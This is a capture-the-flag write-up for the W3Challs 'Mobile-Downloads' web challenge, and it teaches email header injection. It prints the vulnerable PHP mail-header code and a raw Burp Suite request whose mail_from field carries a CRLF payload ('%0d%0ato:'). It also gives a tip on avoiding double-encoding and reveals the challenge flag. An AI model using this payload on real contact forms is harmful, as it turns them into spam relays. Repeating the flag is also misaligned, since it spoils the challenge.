# Mobile-Downloads

1. First, lets go through the website.
2. Then, we read the Hint : Spam! The goal is just to send an email to any unexpected recipient, not to become admin. You'll get the flag if a correct attack payload is detected, no bot will visit the page and you'll not get emails if your attack works.
3. So, the goal now is to send an email to anyone except for "admin@mobile-downloads.hax.w3challs.com"
4. Here is the [source code](http://mobile-downloads.hax.w3challs.com/mail_src.php) and we are able to see that all we have to do is something like [CRLF injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection) and get the flag.
5. The main question now is how we send the request. We have to use burp suite to help us. I used burp suite and firefox to complete the challenge.
6. After we connect on the proxy on the burp suite, we first send some information. As me, I just send "123" of all three blank and get the feedback : 
    ```
    POST /?contact= HTTP/1.1
    Host: mobile-downloads.hax.w3challs.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 47
    Origin: http://mobile-downloads.hax.w3challs.com
    Connection: close
    Referer: http://mobile-downloads.hax.w3challs.com/?contact=
    Upgrade-Insecure-Requests: 1

    mail_from=123&mail_subject=123&mail_content=123
    ```
    Now, we have to use CRLF injection to attack the place in the source code : 
    ```
    $headers = 'From: '.$from."\r\n".
                      'Reply-To: '.$from."\r\n".
                      'X-Mailer: PHP/'.phpversion();
    ```
    So, as we already know, we have to use the keywords "%0d%0a" to make it transfer into "\r\n". Here is the payload : 
    ```
    POST /?contact= HTTP/1.1
    Host: mobile-downloads.hax.w3challs.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 47
    Origin: http://mobile-downloads.hax.w3challs.com
    Connection: close
    Referer: http://mobile-downloads.hax.w3challs.com/?contact=
    Upgrade-Insecure-Requests: 1

    mail_from=123%0d%0ato:456&mail_subject=123&mail_content=123
    ```
    And click forward then you are able to see the flag.
7. Here is some tips, you can't send the data directly like "123%0d%0ato:456". If you use burp suite to check the data, you will find out that the data is encoded and become "123%250d%250ato%3A456" but we want to send "%0d%0a" so we have to use burp suite to change the value. Or you can find words that are able to be transfer into the payload as same as I did and you can still pass the challenge.
8. Here is the flag : W3C{3v1l_Sp4m_1s_3v1l}
